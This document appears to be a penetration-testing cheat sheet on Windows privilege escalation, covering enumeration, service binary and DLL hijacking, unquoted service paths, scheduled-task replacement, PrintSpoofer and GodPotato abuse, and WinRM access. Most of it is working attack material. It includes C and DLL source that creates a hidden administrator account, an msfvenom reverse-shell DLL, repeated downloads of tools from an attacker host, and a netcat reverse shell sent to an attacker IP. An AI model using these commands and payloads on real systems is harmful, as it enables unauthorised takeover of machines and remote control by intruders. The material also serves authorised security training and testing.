# Escalation

CLI escalation: [bottom of the page](https://github.com/ThomasBucaioni/pentools/blob/main/microsoft/escalation.md#cli-escalation)

## Info

### Targets

- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

### Users

```
whoami
whoami /priv
whoami /groups
net user
get-localuser
Get-WmiObject -Class Win32_UserAccount
```

### Groups

```
net localgroup
Get-LocalGroup
Get-LocalGroupMember somegroup
```

### System

Windows versions: https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions#/media/File:Windows_Version_History.svg
```
ver
systeminfo
```

### Network

```
ipconfig
ipconfig /all
route print
netstat -ano
```

### Programs

Invoke-command: https://devblogs.microsoft.com/scripting/use-powershell-to-find-installed-software/
```
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
Format-Table -AutoSize
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
Registry keys: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7.3
```
Get-ChildItem -Path HKLM:\HARDWARE
```

### Processes

source: https://stackoverflow.com/questions/31374644/get-process-location-path-using-powershell
```
Get-Process
Get-Process -name someprocess |  % { $_.Path + " " + $_.Id}
Get-Process | Select-Object Path
Get-Process | Select-Object -ExpandProperty Path
Get-Process | ForEach-Object {$_.Path}
(Get-Process -Name someprocess).path
(Get-Process -Id someid).path
```

## Other searches

### Files

Find:
```
Get-ChildItem -Path C:\ -Include *.extension -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\*.txt -Recurse -Force
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue | select-object name
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
Display:
```
type somefile.txt
cat somefile.txt
Get-Content somefile.txt
```


### History
```
Get-History
(Get-PSReadlineOption).HistorySavePath
```

### Automatic tools

#### WinPEAS

Upload on the target:
```
kali$ cd /usr/share/peass/winpeas/
kali$ python3 -m http.server 8088
PS> iwr -uri http://AttackerIP/winPEASx64.exe -Outfile winPEAS.exe
```
To check, never blindly trust the output of a tool:
- _Basic System Information_
- _Users_ output section
- information about processes, services, scheduled tasks, network information, and installed applications
- _Looking for possible password files in users homes_

#### Other tools

URLs:
- https://github.com/carlospolop/PEASS-ng
- https://github.com/GhostPack/Seatbelt
- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
- https://github.com/Marshall-Hallenbeck/compiled_binaries
- https://github.com/411Hall/JAWS

##### Example: Seatbelt

Compiled version: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe

Usage:
```
PS> iwr http://IpAttacker/Seatbelt.exe -OutFile Seatbelt.exe
PS> .\Seatbelt.exe -group=all
```

## Services Hijacking

List services (warning, needs an RDP connection for non-admin users. A bind shell or WinRM connection won't do):
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode, State, PathName | Where-Object {$_.State -like 'Running'}
```
Check the rights to overwrite user installed binaries:
```
PS> Get_ACL "c:\path\to\user\installed\binary\service.exe" | Format-List
cmd> icacls "c:\path\to\user\installed\binary\service.exe"
```
Permission mask: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls

### Binary

#### Manual hijacking: `useradd.c` code

To compile with [cross-compilation](https://github.com/ThomasBucaioni/pentools/blob/main/microsoft/cross-compiling.md): `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user someuser somepass /add");
  i = system ("net localgroup administrators someuser /add");
  
  return 0;
}
```
Upload on the target:
```
iwr -uri http://$IpAttacker/adduser.exe -outfile adduser.exe
```
Overwrite a service binary:
```
move c:\path\to\binary\someservice.exe adduser.exe
```
and restart the computer (with Privilege __SeShutdownPrivilege__, check with `whoami /priv`):
```
shutdown /r /t 0
```
or restart the service if possible (usually takes admin rights...):
```
net stop someservice.exe
sc.exe start some_service_name
start-service some_service_name
```

Compilation on Kali (see cross-compiling.md):
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

#### Auto

Never blindly trust or rely on the output of automated tools. On Kali:
```
kali$ cd /usr/share/windows-resources/powersploit/Privesc/
kali$ python3 -m http.server 80
```
On the target:
```
PS> iwr -uri http://$AttackerIP/PowerUp.ps1 -Outfile PowerUp.ps1
PS> powershell -ep bypass
PS> . .\PowerUp.ps1
PS> Get-ModifiableServiceFile
```

### DLLs

#### Compiled DLL

Same as binary hijacking:
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls .\path\to\custom_service.exe
```
then use [ProcMon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to check DLL calls by a service: `Filter menu > Filter > Process name / is / Value / Include`
```
Restart-Service some_custom_service
```
A missing DLL is searched in [specific order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order), which can allow to hijack the call with a [boiler plate](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#the-dll-entry-point):
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user fakeadmin fakepass123! /add");
  	    i = system ("net localgroup administrators fakeadmin /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Cross-compile it: 
```
x86_64-w64-mingw32-gcc hijackedDLL.cpp --shared -o missingDLL.dll
```
Upload it in an available path according to the search order:
```
iwr -uri http://$AttackerIp/missingDLL.dll -outfile missingDLL.dll
```
and restart the service:
```
Restart-Service custom_service
```
The `fakeadmin` user should be created:
```
net user
net localgroup administrators
```

#### Make a reverse shell DLL

With `msfvenom`:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$AttackerIp LPORT=$AttackerPort -f dll -o missingDLL.dll
```
and upload it on the target


### Unquoted service path

Unquoted path search in Powershell:
```
Get-CimInstance -classname Win32_Service | select pathname | select-string -pattern '\\.* .*\\' | select-string -pattern '"' -notmatch
```

In `cmd`:
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ # in cmd...
icacls c:\all\the\paths
```
then hijack an unquoted path:
```
cd c:\Program Files\SomeDir\
iwr -uri http://$AttackerIp/adduser.exe -outfile OtherDirWithUnquotedSpacesToHijack.exe
Restart-service service_name
```
and check the fake admin:
```
net user
net localgroup administrators
```

With `PowerUp.ps1`:
```
iwr -uri http://$AttackerIp/PowerUp.ps1 -outfile powerup.ps1
powershell -ep bypass
. .\powerup.ps1
Get-UnquotedService
Write-ServiceBinary -name 'vulnerable_service_path' -path "C:\unquoted path\"
Restart-Service vulnerable_service_name
```

## Other components

### Scheduled tasks

List the task:
```
cmd> schtasks /query /fo LIST /v
PS>  schtasks.exe /query /fo list /v | select-string -pattern 'Task To Run' | select-string -pattern '\\system32\\' -NotMatch | select-string -pattern 'Com handler' -NotMatch
PS> schtasks.exe /query /fo list /v | select-string -pattern 'c:\path\to\suspected_scheduled_task.exe' -context 8,25
```
Check the ACL:
```
icacls C:\Users\hackeduser\somedir\some_scheduled_task.exe
```
Replace the binary:
```
iwr -uri http://$AttackerIp/adduser.exe -outfile some_scheduled_task.exe
```
And wait for the scheduled task to run

### Exploits

Example with __SeImpersonatePrivige__:
- Find a user with the __SeImpersonatePrivilege__ privilege assigned
- Download [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe) and share it with a python http server: 
```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80
```
- Upload it on the target: `iwr -uri http://$AttackerIp/PrintSpoofer64.exe -outfile printspoofer.exe`
- Impersonate the __NT AUTHORITY\SYSTEM__ context with PrintSpoofer:
```
PS> .\printspoofer.exe -i -c powershell.exe
PS> whoami # nt authority\system
```

Other privileges: SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug

Exploit references:
- https://github.com/itm4n/PrintSpoofer
- https://jlajara.gitlab.io/Potatoes_Windows_Privesc
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer

Example with GodPotato: 
```
cmd> .\GodPotato.exe -cmd "c:\path\to\nc.exe -t -e C:\Windows\System32\cmd.exe $AttackerIp $AttackerPort"
```

---

## Cli escalation

### Local

#### Runas (cmd)

With a password found in `somefile.txt`, we can use `Runas` if in a GUI (triggers a prompt): https://lazyadmin.nl/it/runas-command/
```
PS> runas /user:somehackeduser cmd
```
then elevate privileges:
```
cmd> powershell start-process powershell -verb runas
```
or in current directory:
```
cmd> powershell.exe -Command "Start-Process cmd \"/k cd /d %cd%\" -Verb RunAs"
```

#### Powershell

Other user authentication, password entered manually: https://stackoverflow.com/questions/28989750/running-powershell-as-another-user-and-launching-a-script
```
Start-Process powershell.exe -Credential “domain\username” -NoNewWindow -ArgumentList “Start-Process powershell.exe -Verb runAs”
```
or with password provided in a **Credential** object:
```
$username = 'user'
$password = 'password'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process Notepad.exe -Credential $credential
```

### WinRM and Evil-WinRM remote connection

#### Command `Enter-PSSession`

From Powershell:
```
$password = ConvertTo-SecureString "hackedpassword" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("hackeduser", $password)
Enter-PSSession -ComputerName SOMEHACKEDHOSTNAME -Credential $cred
```

#### Evil-WinRM

With `evil-winrm` from *Kali*, when a bindshell or WinRM connection (as with `Enter-PSSession`) don't work:
```
kali$ evil-winrm -i $TargetIP -u hackeduser -p "somehackedpass"
```

